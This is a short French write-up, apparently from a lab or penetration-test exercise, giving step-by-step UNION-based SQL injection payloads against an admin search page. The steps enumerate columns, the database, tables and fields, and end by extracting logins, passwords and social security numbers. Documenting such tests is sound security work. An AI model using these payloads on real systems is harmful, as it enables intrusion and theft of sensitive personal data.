# Injection SQL UNION-based — étapes manuelles

Cible : app-vulnerable/admin/RechercheUtilisateur.php?nom=...
Pré-requis : être authentifié en tant qu'admin (session).

## Étape 1 — Nombre de colonnes
?nom=x' ORDER BY 1-- -
?nom=x' ORDER BY 2-- -
?nom=x' ORDER BY 3-- -
?nom=x' ORDER BY 4-- -   <- erreur ici => 3 colonnes
Résultat : [capture sqli_01_colonnes.png]

## Étape 2 — Nom de la base de données
?nom=' UNION SELECT 1, database(), 3-- -
Résultat : [capture sqli_02_database.png]

## Étape 3 — Découverte des tables
?nom=' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()-- -
Résultat : [capture sqli_03_tables.png]

## Étape 4 — Énumération des colonnes de la table users
?nom=' UNION SELECT 1, GROUP_CONCAT(column_name SEPARATOR ', '), 3 FROM information_schema.columns WHERE table_name='users'-- -
Résultat : [capture sqli_04_colonnes_users.png]

## Étape 5 — Extraction des données
?nom=' UNION SELECT 1, GROUP_CONCAT(identifiant,':',mot_de_passe,':',num_securite_sociale SEPARATOR '<br>'), 3 FROM users-- -
Résultat : [capture sqli_05_extraction.png]